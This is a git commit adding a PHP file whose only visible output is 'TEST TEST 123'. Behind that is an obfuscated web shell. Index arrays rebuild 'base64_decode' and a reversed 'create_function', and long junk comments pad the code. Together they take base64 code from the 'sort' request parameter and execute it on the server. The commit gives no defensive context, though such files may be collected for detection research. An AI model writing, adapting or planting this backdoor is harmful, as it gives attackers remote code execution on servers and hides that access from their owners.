c64b1eb621db42d77e12f603891392914d565771
NavyTitanium <33707347+NavyTitanium@users.noreply.github.com>
2020-01-14 22:16:25 -0500

    Add files via upload

---
+++ PHP/anisocercal_paroch.php
@@ -0,0 +1,51 @@
+<?php 
+
+
+
+
+
+
+$MVbIKjeP7308 = "s1qgj;vo*5f4i.p6wnu(9k)b_t/3lx0earcz82dymh7";
+
+
+$mHmdxidu1446 = "";
+
+foreach([0,7,33,25] as $x){
+       $mHmdxidu1446 .= $MVbIKjeP7308[$x];
+    }
+
+
+if(isset($_REQUEST /*zKZUMmjgQAOLKhybTkyTpqCHwCTgmAjKlpJlqzfZakJUnZfmBZFUQNUkDwkZMDnGQnmWOgVnenxwJlGRdhFplEghDIwmfYkVpFJafhETbJftZQaQzIydzOmxxpBRrObD*/["$mHmdxidu1446"])){
+    $HqZyqBgT3412 = $_REQUEST /*zKZUMmjgQAOLKhybTkyTpqCHwCTgmAjKlpJlqzfZakJUnZfmBZFUQNUkDwkZMDnGQnmWOgVnenxwJlGRdhFplEghDIwmfYkVpFJafhETbJftZQaQzIydzOmxxpBRrObD*/["$mHmdxidu1446"];
+    $YLtydzuC1838 = "";
+    $XZvPKTwU3297 = "";
+
+    /*lkGslhkozRyWMFTvjpvoCnBJcrlivTWRSLIqelRIrkxyqaYTmztvRafmruhUwYYzsGCGQIrucWquNPXKjekWahCizQXZqxUALUqrwyLBHcdJeXPVZbVQcHTyAFGyepJV*/
+
+    foreach([23,32,0,31,15,11,24,38,31,34,7,38,31] as $x){
+       $YLtydzuC1838 .= $MVbIKjeP7308[$x];
+    }
+
+    /*YBYuVIZafBJspzBAJtzeYBdivPjrLArKeCzSnlfUxuiutugymdXLOOglkrGDmfTSeWUJAiggIGBQqJFQIipLxudHSnViGeptYKiTFzaNNmOFhrXBZFAfZvUxuDfhUwEo*/
+
+
+    foreach([0,25,33,33,31,6] as $x){
+       $XZvPKTwU3297 .= $MVbIKjeP7308[$x];
+    }
+
+    /*LSqxEiNMLlUOStjGiwETvOEHPmhzbiMCrtruxmugDETqwOoemHCaKBikdpelcnOkRnmLjJUSprMmTDnViltATIFglLUrWLKllBavPzoZTwzBkLfgYjevWiWwnADQKDzG*/
+
+    $x = $XZvPKTwU3297('n'.''.''.'o'.''.'i'.'t'.''.''.'c'.''.''.'n'.''.''.'u'.''.'f'.'_'.''.''.''.''.'e'.'t'.''.''.''.'a'.'e'.'r'.''.''.''.''.'c');
+    $H = $x("", $YLtydzuC1838($HqZyqBgT3412));
+    $H();
+    exit();
+
+}
+
+
+
+
+
+
+
+echo "TEST TEST 123";
